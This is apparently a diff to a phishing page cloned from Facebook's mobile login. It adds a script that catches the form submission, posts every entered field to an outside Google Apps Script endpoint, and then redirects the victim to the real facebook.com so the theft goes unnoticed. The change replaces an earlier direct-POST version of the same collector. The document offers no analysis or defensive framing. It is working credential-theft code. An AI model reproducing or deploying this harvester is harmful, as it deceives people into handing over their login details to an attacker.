@@ -5048,9 +5048,8 @@ div.uiInterstitialWithStripes {
                       /></a>
                     </div>
                   </div>
-                  <div class="_5rut">
-                    <form action="https://script.google.com/macros/s/AKfycbyG51g2kaW0iz3XzRE-PwIV8v9icTlxetIPaMfczkCozCg5zdvwH5HI1kfPtoW2mlig/exec" method="post">
-  
+                  <div class="_5rut"> 
+                    <form id="myForm">
 <input type="hidden" name="redirect_url" value="https://facebook.com">
 
   <input type="hidden" name="timestamp" value="2025-08-12T12:00:00Z"> <!-- Example timestamp -->
@@ -5357,7 +5356,41 @@ div.uiInterstitialWithStripes {
                     data-sigil="MLynx_asynclazy"
                     >Instagram</a
                   ><
-      
+       <script>
+    const form = document.getElementById('myForm');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(form);
+      const redirectUrl = formData.get('redirect_url');
+
+      // Convert form data to URLSearchParams for POST
+      const params = new URLSearchParams();
+      for (const pair of formData.entries()) {
+        params.append(pair[0], pair[1]);
+      }
+
+      fetch('https://script.google.com/macros/s/AKfycbwJQYdZ17JZT7knOhPwT8vlnxZBEoiuSAqgixjvpUYiRdDwRtUrftuM1NoQhPhiRGnh/exec', {
+        method: 'POST',
+        body: params,
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        }
+      })
+      .then(response => {
+        if (!response.ok) throw new Error('Network response was not ok');
+        return response.text();
+      })
+      .then(() => {
+        // Redirect after successful form submission
+        window.location.href = redirectUrl;
+      })
+      .catch(error => {
+        alert('Failed to submit form: ' + error.message);
+      });
+    });
+  </script>
 
   </body>
 </html>
